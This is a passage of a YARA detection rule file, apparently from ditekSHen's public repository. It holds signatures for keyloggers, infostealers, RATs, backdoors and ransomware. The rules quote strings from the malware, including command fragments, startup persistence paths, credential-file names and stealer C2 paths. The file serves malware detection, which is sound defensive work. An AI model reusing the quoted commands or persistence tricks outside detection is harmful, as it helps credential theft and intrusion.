		$s6 = "\\AutoFills.txt" ascii wide
		$s7 = "\\CreditCards.txt" ascii wide
		$s8 = "a -y -mx9 -ssw" ascii wide
		$s9 = "\\Passwords.txt" ascii wide
		$s10 = "\\Information.txt" ascii wide
		$s11 = "\\getMe" ascii wide

	condition:
		9 of them or ( ( 1 of ( $x* ) and 4 of ( $s* ) ) or 1 of ( $x* ) )
}
rule DITEKSHEN_MALWARE_Win_Orion : FILE
{
	meta:
		description = "Orion Keylogger payload"
		author = "ditekSHen"
		id = "b380b93b-6ceb-5244-aeca-b1f8f9a5b553"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L985-L1005"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9e5521ebaf9bdef6dadd2a2a093bd6f87ded023d9a74db126ac8ec9a5f1f9744"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "\\Ranger.BrowserLogging" ascii wide nocase
		$s2 = "GrabAccounts" fullword ascii
		$s3 = "DownloadFile" fullword ascii
		$s4 = "Internet Explorer Recovery" wide
		$s5 = "Outlook Recovery" wide
		$s6 = "Thunderbird Recovery" wide
		$s7 = "Keylogs -" wide
		$s8 = "WebCam_Capture.dll" wide
		$s9 = " is not installed on this computer!" wide
		$s10 = "cmd /c bfsvc.exe \"" wide
		$s11 = "/Keylogs - PC:" fullword wide
		$s12 = "/PC:" fullword wide
		$s13 = "<p style=\"color:#CC7A00\">[" wide

	condition:
		( uint16( 0 ) == 0x5a4d and 5 of ( $s* ) ) or ( 6 of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Win_Aspire : FILE
{
	meta:
		description = "Aspire Keylogger payload"
		author = "ditekSHen"
		id = "25724975-f373-553e-b27e-43168e956c16"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1007-L1022"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3ea0136dbacb79e4c7556f562d17b26b84ac3e4c967b117021e2399ded0a0fdf"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "AspireLogger -" wide
		$s2 = "Application: @" wide
		$s3 = "encryptedUsername" wide
		$s4 = "encryptedPassword" wide
		$s5 = "Fetch users fron logins" wide
		$s6 = "URI=file:" wide
		$s7 = "signons.sqlite" wide
		$s8 = "logins.json" wide

	condition:
		( uint16( 0 ) == 0x5a4d and 6 of ( $s* ) ) or ( 7 of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Win_S05Kitty : FILE
{
	meta:
		description = "Sector05 Kitty RAT payload"
		author = "ditekSHen"
		id = "3261f6b6-21e7-5195-98db-9607ba530572"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1024-L1045"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "df2930694671c9ca16f2afeb799704647c9acf32be118706c342347ffe8ceb36"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Execute Comand" ascii
		$s2 = "InjectExplorer" ascii
		$s3 = "targetProcess = %s" fullword ascii
		$s4 = "Process attach (%s)" fullword ascii
		$s5 = "process name: %s" fullword ascii
		$s6 = "cmd /c %s >%s" fullword ascii
		$s7 = "CmdDown: %s, failed" fullword ascii
		$s8 = "http://%s%s/%s" fullword ascii
		$s9 = "tmp.LOG" fullword ascii
		$x1 = "zerodll.dll" fullword ascii
		$x2 = "OneDll.dll" fullword ascii
		$x3 = "kkd.bat" fullword ascii
		$x4 = "%s\\regsvr32.exe /s \"%s\"" fullword ascii
		$x5 = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fontchk.jse" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 8 of ( $s* ) or all of ( $x* ) )
}
rule DITEKSHEN_MALWARE_Win_Fakewmi : FILE
{
	meta:
		description = "FakeWMI payload"
		author = "ditekSHen"
		id = "689bc207-2bc6-50de-80d6-d1ba0a26b264"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1047-L1064"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "627886cdd01f5f02e454ef284c77c87eb027ee33f6a51536758fb7f095271a40"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.Fakewmi"

	strings:
		$s1 = "-BEGIN RSA PUBLIC KEY-" ascii
		$s2 = ".exe|" ascii
		$s3 = "cmd /c wmic " ascii
		$s4 = "cmd /c sc " ascii
		$s5 = "schtasks" ascii
		$s6 = "taskkill" ascii
		$s7 = "findstr" ascii
		$s8 = "netsh interface" ascii
		$s9 = "CreateService" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $s* ) and #s2 > 10 )
}
rule DITEKSHEN_MALWARE_Win_Baldr : FILE
{
	meta:
		description = "Baldr payload"
		author = "ditekSHen"
		id = "cdc35a11-a97b-5e21-929e-01fed5172b55"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1066-L1083"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f8e97fd618209bc6ce609b60b1e1f1e359be7678474fad3b18a529487c64cd99"
		score = 75
		quality = 73
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.Baldr"

	strings:
		$x1 = "BALDR VERSION : {0}" fullword wide
		$x2 = "Baldr" fullword ascii wide
		$x3 = "{0}\\{1:n}.exe" fullword wide
		$x4 = ".doc;.docx;.log;.txt;" fullword wide
		$s1 = "<GetMAC>b__" ascii
		$s2 = "<ExtractPrivateKey3>b__" ascii
		$s3 = "UploadData" fullword ascii
		$s6 = "get_NetworkInterfaceType" fullword ascii
		$s5 = "get_Passwordcheck" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d and all of ( $x* ) ) or ( 2 of ( $x* ) and 4 of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Win_Rietspoof : FILE
{
	meta:
		description = "Rietspoof payload"
		author = "ditekSHen"
		id = "b2d94705-ca59-56ae-8471-2c6895d355dc"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1110-L1140"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d1d9baab83c904d1e8dcd7aeacdabfc79c1acee67006793c2240a42ebf9c62b2"
		score = 75
		quality = 73
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.Rietspoof"

	strings:
		$c1 = "%s%s%s USER: user" fullword ascii
		$c2 = "cmd /c %s" fullword ascii
		$c3 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(" ascii
		$c4 = "WScript.Quit" fullword ascii
		$c5 = "CPU: %s(%d)" fullword ascii
		$c6 = "RAM: %lld Mb" fullword ascii
		$c7 = "data.dat" fullword ascii
		$c8 = "%s%s%s USER:" ascii
		$v1_1 = ".vbs" ascii
		$v1_2 = "HELLO" ascii
		$v1_3 = "Wscript.Sleep" ascii
		$v1_4 = "User-agent:Mozilla/5.0 (Windows; U;" ascii
		$v2_1 = "Xjoepxt!" ascii
		$v2_2 = "Content-MD5:%s" fullword ascii
		$v2_3 = "M9h5an8f8zTjnyTwQVh6hYBdYsMqHiAz" fullword ascii
		$v2_4 = "GET /%s?%s HTTP/1.1" fullword ascii
		$v2_5 = "GET /?%s HTTP/1.1" fullword ascii
		$pdb1 = "\\techloader\\loader\\loader.odb" ascii wide
		$pdb2 = "\\loader\\Release\\loader_v1.0.pdb" ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and ( 7 of ( $c* ) and ( 3 of ( $v* ) or 1 of ( $pdb* ) ) )
}
rule DITEKSHEN_MALWARE_Win_Modirat : FILE
{
	meta:
		description = "MoDiRAT payload"
		author = "ditekSHen"
		id = "8b641c7a-5ebd-50e7-83cb-e408683c456b"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1142-L1158"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d0760e9dab7e9c0affb2193ea249feea8bb58e519522ca2a562f015059ad5590"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "add_Connected" fullword ascii
		$s2 = "Statconnected" fullword ascii
		$s3 = "StartConnect" fullword ascii
		$s4 = "TelegramTitleDetect" fullword ascii
		$s5 = "StartTitleTelegram" fullword ascii
		$s6 = "Check_titles" fullword ascii
		$s7 = "\\MoDi RAT V" ascii
		$s8 = "IsBuzy" fullword ascii
		$s9 = "Recording_Time" fullword wide

	condition:
		( uint16( 0 ) == 0x5a4d and 7 of them ) or all of them
}
rule DITEKSHEN_MALWARE_JS_Koadicjs
{
	meta:
		description = "Koadic post-exploitation framework JS payload"
		author = "ditekSHen"
		id = "8598d5cb-0486-52b0-a686-6bd014f35c44"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1188-L1208"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "689116f74996fecf4c16c224e8cd842ad5b5e989de2dfdf0debeb9a26d8a12fa"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "window.moveTo(-" ascii
		$s2 = "window.onerror = function(sMsg, sUrl, sLine) { return false; }" fullword ascii
		$s3 = "window.onfocus = function() { window.blur(); }" fullword ascii
		$s4 = "window.resizeTo(" ascii
		$s5 = "window.blur();" fullword ascii
		$hf1 = "<hta:application caption=\"no\" windowState=\"minimize\" showInTaskBar=\"no\"" fullword ascii
		$hf2 = "<hta:application caption=\"no\" showInTaskBar=\"no\" windowState=\"minimize\" navigable=\"no\" scroll=\"no\""
		$ht1 = "<hta:application" ascii
		$ht2 = "caption=\"no\"" ascii
		$ht3 = "showInTaskBar=\"no\"" ascii
		$ht4 = "windowState=\"minimize\"" ascii
		$ht5 = "navigable=\"no\"" ascii
		$ht6 = "scroll=\"no\"" ascii

	condition:
		all of ( $s* ) and ( 1 of ( $hf* ) or all of ( $ht* ) )
}
rule DITEKSHEN_MALWARE_Win_NETEAGLE : FILE
{
	meta:
		description = "NETEAGLE backdoor payload"
		author = "ditekSHen"
		id = "89d1304a-63a0-50fc-855a-2e36cde1c5e7"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1210-L1225"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "148de0ca332d3885d94eae8d15eb4aaa2bc4950c691c0e8817c816b7d4c55510"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword ascii
		$s2 = "System\\CurrentControlSet\\control\\ComputerName\\ComputerName" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 5.0; Win32)" fullword ascii
		$s4 = "/index.htm" fullword ascii
		$s5 = "Help_ME" fullword ascii
		$s6 = "GOTO ERROR" ascii
		$s7 = "127.0.0.1" fullword ascii
		$s8 = /pic\d\.bmp/ ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and 7 of them
}
rule DITEKSHEN_MALWARE_WIN_BACKSPACE : FILE
{
	meta:
		description = "BACKSPACE backdoor payload"
		author = "ditekSHen"
		id = "ff9b1c2e-66a1-5e09-8bc2-a7543161e518"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1227-L1247"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3d366327c2272761349687b11e4d6baada5000936dc7f81665e0303f7d1e5121"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Software\\Microsoft\\PnpSetup" ascii wide
		$s2 = "Mutex_lnkword_little" ascii wide
		$s3 = "(Prxy%c-%s:%u)" fullword ascii
		$s4 = "(Prxy-No)" fullword ascii
		$s5 = "/index.htm" fullword ascii
		$s6 = "CONNECT %s:%d" ascii
		$s7 = "\\$NtRecDoc$" fullword ascii
		$s8 = "qazWSX123$%^" ascii
		$s9 = "Software\\Microsoft\\Core" ascii wide
		$s10 = "Mutex_lnkch" ascii wide
		$s11 = "Event__lnkch__" ascii wide
		$s12 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)" fullword ascii
		$s13 = "User-Agent: Mozilla/5.00 (compatible; MSIE 6.0; Win32)" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 8 of them
}
rule DITEKSHEN_MALWARE_Win_Rhttpctrl : FILE
{
	meta:
		description = "RHttpCtrl backdoor payload"
		author = "ditekSHen"
		id = "fa80db13-90af-5d6a-bcc2-ad1f6808268e"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1249-L1265"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a8b27fcc4636c2fe02a0e006295ece7f705cc9a042921f66ef1f9b6a88aaf9a1"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "%d_%04d%02d%02d%02d%02d%02d." ascii
		$s2 = "ver=%s&id=%06d&type=" ascii
		$s3 = "ver=%d&id=%s&random=%d&" ascii
		$s4 = "id=%d&output=%s" ascii
		$s5 = "Error:WinHttpCrackUrl failed!/n" ascii
		$s6 = "Error:SendRequest failed!/n" ascii
		$s7 = ".exe a %s %s" ascii
		$s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0" fullword wide
		$pdb = "\\WorkSources\\RHttpCtrl\\Server\\Release\\svchost.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 5 of ( $s* ) or ( $pdb and 2 of ( $s* ) ) )
}
rule DITEKSHEN_MALWARE_Win_Pillowmint : FILE
{
	meta:
		description = "PillowMint POS payload"
		author = "ditekSHen"
		id = "e3d26a12-45aa-5f5d-997a-f350bc1bea97"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1267-L1283"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ed2597fce1c56d2e110790e0eb89834b1bb9f6f52d39105157c9ffe2ede6cc7a"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "system32\\sysvols\\" ascii nocase
		$s2 = "Sysnative\\sysvols\\" ascii nocase
		$s3 = "critical.log" fullword ascii
		$s4 = "log.log" fullword ascii
		$s5 = "commands.txt" fullword ascii
		$s6 = "_EV0LuTi0N_" ascii
		$s7 = /(file|reg)\scmd:/ fullword ascii
		$s8 = "dumper_nologs_" ascii
		$s9 = "ReflectiveLoader" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 6 of them
}
rule DITEKSHEN_MALWARE_Win_Blackshadesrat : FILE
{
	meta:
		description = "BlackshadesRAT / Cambot POS payload"
		author = "ditekSHen"
		id = "bd0ad920-109a-50b5-94af-6580684bff52"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1285-L1300"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "5c2a76ce52bce9c37a3518ff459011acb733c2c5abac74786e41a1c169459ce2"
		score = 75
		quality = 75
		tags = "FILE"
		snort_sid = "920208-920210"

	strings:
		$s1 = "bhookpl.dll" fullword wide
		$s2 = "drvloadn.dll" fullword wide
		$s3 = "drvloadx.dll" fullword wide
		$s4 = "SPY_NET_RATMUTEX" fullword wide
		$s5 = "\\dump.txt" fullword wide
		$s6 = "AUTHLOADERDEFAULT" fullword wide
		$pdb = "*\\AC:\\Users\\Admin\\Desktop_old\\Blackshades project\\bs_bot\\bots\\bot\\bs_bot.vbp" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and ( 4 of ( $s* ) or ( $pdb and 2 of ( $s* ) ) )
}
rule DITEKSHEN_MALWARE_Win_Plurox : FILE
{
	meta:
		description = "Plurox backdoor payload"
		author = "ditekSHen"
		id = "c8a97132-c1d5-5456-a055-d46a9399dbdd"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1316-L1328"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c2ec2ce7a9210d8eebb06c755eab51cab93fe6d48d737fd1756ffe42d46b35d1"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "autorun.c" fullword ascii
		$s2 = "launcher.c" fullword ascii
		$s3 = "loader.c" fullword ascii
		$s4 = "stealth.c" fullword ascii
		$s5 = "RunFromMemory" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_MALWARE_Win_Avalon : FILE
{
	meta:
		description = "Avalon infostealer payload"
		author = "ditekSHen"
		id = "3de01419-9f45-5d82-8391-2e1e41df2b34"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1330-L1359"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "1aa9dc09ec4c8962dee0455dd367e32139e4c03f1b306f17ac6e82d71aacf713"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Parsecards" fullword ascii
		$s2 = "Please_Gofuckyouself" fullword ascii
		$s3 = "GetDomainDetect" fullword ascii
		$s4 = "GetTotalCommander" fullword ascii
		$s5 = "KnownFolder" fullword ascii
		$s6 = "set_hidden" fullword ascii
		$s7 = "set_system" fullword ascii
		$l1 = "\\DomainDetect.txt" wide
		$l2 = "\\Grabber_Log.txt" wide
		$l3 = "\\Programs.txt" wide
		$l4 = "\\Passwords_Edge.txt" wide
		$l5 = "\\KL.txt" wide
		$w1 = "dont touch" fullword wide
		$w2 = "Grabber" fullword wide
		$w3 = "Keylogger" fullword wide
		$w4 = "password-check" fullword wide
		$w5 = "H4sIAAAAAAAEA" wide
		$p1 = "^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$" wide
		$p2 = "^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$" wide

	condition:
		uint16( 0 ) == 0x5a4d and 8 of them
}
rule DITEKSHEN_MALWARE_Linux_Kinsing : FILE
{
	meta:
		description = "Kinsing RAT payload"
		author = "ditekSHen"
		id = "b13d2c36-c8d3-5138-9e9a-8b5390a93c8d"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1361-L1376"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "566eb7d1864e3a8088ad4f5d032d6d62a33080bbfc5c20c2520315cfc8146afc"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "backconnect" ascii
		$s2 = "connectForSocks" ascii
		$s3 = "downloadAndExecute" ascii
		$s4 = "download_and_exec" ascii
		$s5 = "masscan" ascii
		$s6 = "UpdateCommand:" ascii
		$s7 = "exec_out" ascii
		$s8 = "doTask with type %s" ascii

	condition:
		uint16( 0 ) == 0x457f and 6 of them
}
rule DITEKSHEN_MALWARE_Win_Avaddon : FILE
{
	meta:
		description = "Avaddon ransomware payload"
		author = "ditekSHen"
		id = "d5618c8a-17b7-5009-9947-a6462ad2a4af"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1378-L1395"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "fc3032572d2ab2550d3dde738a3d403459da9b5b640acc814596d958b83620bf"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\IMAGEM~1.%d\\VISUA~1\\BIN\\%s.exe" ascii
		$s2 = "\\IMAGEM~1.%.2d-\\VISUA~1\\BIN\\%s.exe" ascii
		$s3 = "\\IMAGEM~1.%d-Q\\VISUA~1\\BIN\\%s.exe" ascii
		$s4 = "\\IMAGEM~1.%d\\%s.exe" ascii
		$s5 = "EW6]>mFXDS?YBi?W5] CY 4Z8Y BY7Y BZ8Z CY7Y AY8Z CZ8Y!Y:Z" ascii
		$s6 = "FY  AY 'Z      ;W      @Y  @Y 'Z    Y  @Y (Z" ascii
		$s7 = "\"rcid\":\"" fullword ascii
		$s8 = "\"ip\":\"" fullword ascii wide
		$s9 = ".?AUANEventIsGetExternalIP@@" fullword ascii
		$s10 = ".?AUANEventGetCpuMax@@" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 8 of them
}
rule DITEKSHEN_MALWARE_Win_Prolock : FILE
{
	meta:
		description = "ProLock ransomware payload"
		author = "ditekSHen"
		id = "88fa19ba-238c-5d4d-bf0c-d421ee2ecf1d"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1397-L1413"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b7d2cc71acc4f643a86781d957afcf5203a2f4034b9ca7da93e8227ddee79f3b"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Ransomware.ProLock"

	strings:
		$s1 = ".flat" fullword ascii
		$s2 = ".data" fullword ascii
		$s3 = ".api" fullword ascii
		$s4 = "RtlZeroMemory" fullword ascii
		$s5 = "LoadLibraryA" fullword ascii
		$s6 = "Sleep" fullword ascii
		$s7 = "lstrcatA" fullword ascii
		$s8 = { 55 89 E5 8B 45 08 EB 00 89 45 EC 8D 15 4F 10 40 00 8D 05 08 10 40 00 83 E8 08 29 C2 8B 45 EC 01 C2 31 }

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_MALWARE_Java_Pyrogenic
{
	meta:
		description = "Pyrogenic/Qealler infostealer payload"
		author = "ditekSHen"
		id = "2b9268f0-2f73-51ad-ab72-9289e42e5bb1"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1434-L1446"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bb8cb939f06a376f72dcbbb1f04ec34526f72c3bcc3b146b905a8466826d2c24"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "bbb6fec5ebef0d93" ascii wide
		$s2 = "2a898bc98aaf6c96f2054bb1eadc9848eb77633039e9e9ffd833184ce553fe9b" ascii wide
		$s3 = "addShutdownHook" ascii wide
		$s4 = "obfuscated/META-INF/QeallerV" ascii wide
		$s5 = "globalIpAddress" ascii wide

	condition:
		all of them
}
rule DITEKSHEN_MALWARE_Win_Agentteslav3 : FILE
{
	meta:
		description = "AgentTeslaV3 infostealer payload"
		author = "ditekSHen"
		id = "c44c69dd-5e95-595c-88c7-89e243648198"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1448-L1481"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6c62b2f601eba3c83b60f7f6dbd3d0ec3c01af30f4312df897bb5e902c36fdac"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "get_kbok" fullword ascii
		$s2 = "get_CHoo" fullword ascii
		$s3 = "set_passwordIsSet" fullword ascii
		$s4 = "get_enableLog" fullword ascii
		$s5 = "bot%telegramapi%" wide
		$s6 = "KillTorProcess" fullword ascii
		$s7 = "GetMozilla" ascii
		$s8 = "torbrowser" wide
		$s9 = "%chatid%" wide
		$s10 = "logins" fullword wide
		$s11 = "credential" fullword wide
		$s12 = "AccountConfiguration+" wide
		$s13 = "<a.+?href\\s*=\\s*([\"'])(?<href>.+?)\\1[^>]*>" fullword wide
		$g1 = "get_Clipboard" fullword ascii
		$g2 = "get_Keyboard" fullword ascii
		$g3 = "get_Password" fullword ascii
		$g4 = "get_CtrlKeyDown" fullword ascii
		$g5 = "get_ShiftKeyDown" fullword ascii
		$g6 = "get_AltKeyDown" fullword ascii
		$m1 = "yyyy-MM-dd hh-mm-ssCookieapplication/zipSCSC_.jpegScreenshotimage/jpeg/log.tmpKLKL_.html<html></html>Logtext/html[]Time" ascii
		$m2 = "%image/jpg:Zone.Identifier\\tmpG.tmp%urlkey%-f \\Data\\Tor\\torrcp=%PostURL%127.0.0.1POST+%2B" ascii
		$m3 = ">{CTRL}</font>Windows RDPcredentialpolicyblobrdgchrome{{{0}}}CopyToComputeHashsha512CopySystemDrive\\WScript.ShellRegReadg401" ascii
		$m4 = "%startupfolder%\\%insfolder%\\%insname%/\\%insfolder%\\Software\\Microsoft\\Windows\\CurrentVersion\\Run%insregname%SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\RunTruehttp" ascii
		$m5 = "\\WindowsLoad%ftphost%/%ftpuser%%ftppassword%STORLengthWriteCloseGetBytesOpera" ascii

	condition:
		( uint16( 0 ) == 0x5a4d and ( 8 of ( $s* ) or ( 6 of ( $* ) and all of ( $g* ) ) ) ) or ( 2 of ( $m* ) )
}
rule DITEKSHEN_MALWARE_Win_Taurus : FILE
{
	meta:
		description = "Taurus infostealer payload"
		author = "ditekSHen"
		id = "c02114c1-9c97-5d0c-b7ce-1bd6a00a9e9a"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1483-L1519"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6039c27e69b47dfcc1327c34306627d2d9bd57f6bd365bb80b47ad21f892ae8a"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "t.me/taurus_se" ascii
		$s2 = "rus_seller@explo" ascii
		$s3 = "/c timeout /t 3  & del /f /q" ascii
		$s4 = "MyAwesomePrefix" ascii
		$txt1 = "LogInfo.txt" fullword ascii
		$txt2 = "Information.txt" fullword ascii
		$txt3 = "General\\passwords.txt" fullword ascii
		$txt4 = "General\\forms.txt" fullword ascii
		$txt5 = "General\\cards.txt" fullword ascii
		$txt6 = "Installed Software.txt" fullword ascii
		$txt7 = "Crypto Wallets\\WalletInfo.txt" fullword ascii
		$txt8 = "cookies.txt" fullword ascii
		$url1 = "/cfg/" wide
		$url2 = "/loader/complete/" wide
		$url3 = "/log/" wide
		$url4 = "/dlls/" wide
		$upat = /\.exe;;;\d;\d;\d\]\|\[http/
